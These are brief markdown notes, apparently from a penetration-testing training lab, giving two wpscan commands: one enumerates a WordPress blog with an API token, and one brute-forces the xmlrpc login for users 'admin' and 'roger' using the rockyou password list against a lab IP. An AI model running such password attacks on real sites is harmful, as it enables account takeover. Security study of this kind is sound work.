# wpscan

## enumeration
```shell
wpscan --url http://blog.inlanefreight.local/ --enumerate --api-token cBsXg7
```

## WordPress User Bruteforce
```shell
┌──(root㉿kaljfou)-[~]
└─# wpscan --password-attack xmlrpc -t 20 --usernames admin,roger --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --url http://154.57.164.82:31010  